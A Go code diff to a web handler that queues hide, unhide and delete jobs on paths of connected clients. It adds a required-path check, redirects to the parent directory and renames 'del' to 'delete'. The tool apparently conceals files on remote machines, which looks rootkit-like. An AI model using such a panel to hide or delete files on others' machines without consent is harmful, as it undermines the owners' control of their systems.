@@ -18,6 +18,7 @@ func GET_do(c *fiber.Ctx) error {
 		jobs   *joblist.Type
 		job    *joblist.Job
 
+    targetdir string
 		targetp string
 		res_str string
 		cmd_str string
@@ -30,8 +31,12 @@ func GET_do(c *fiber.Ctx) error {
 	jobs = c.Locals("joblist").(*joblist.Type)
 
 	if targetp = c.Query("p"); targetp == "" {
-		targetp = "/"
+    return util.RenderErr(c, "no path specified", http.StatusBadRequest)
 	}
+
+  if targetdir = path.Dir(targetp); targetdir == "." || targetdir == "" {
+    targetdir = "/"
+  }
 
 	switch cmd_str = c.Query("o"); cmd_str {
 	case "unhide":
@@ -40,7 +45,7 @@ func GET_do(c *fiber.Ctx) error {
 	case "hide":
 		cmd = joblist.CMD_HIDE
 
-	case "del":
+	case "delete":
 		cmd = joblist.CMD_DELETE
 
 	default:
@@ -52,7 +57,7 @@ func GET_do(c *fiber.Ctx) error {
 	res := util.NewBuffer()
 
 	if job, err = jobs.Add(client.ID, cmd, data, res); err != nil {
-		log.Fail("failed to add %s file job: %s", cmd_str, err.Error())
+		log.Fail("failed to add %s path job: %s", cmd_str, err.Error())
 		return util.RenderErr(c, "server error", http.StatusInternalServerError)
 	}
 
@@ -64,12 +69,12 @@ func GET_do(c *fiber.Ctx) error {
 	}
 
 	if res_str = res.String(); res_str != "success" {
-		return util.RenderErr(c, fmt.Sprintf("file %s job failed: %s", cmd_str, res_str), http.StatusGatewayTimeout)
+		return util.RenderErr(c, fmt.Sprintf("path %s job failed: %s", cmd_str, res_str), http.StatusGatewayTimeout)
 	}
 
 	return util.Redirect(c,
 		path.Join("c", client.ID, fmt.Sprintf(
-			"files?p=%s", util.Qescape(targetp),
+			"files?p=%s", util.Qescape(targetdir),
 		)),
 	)
 }
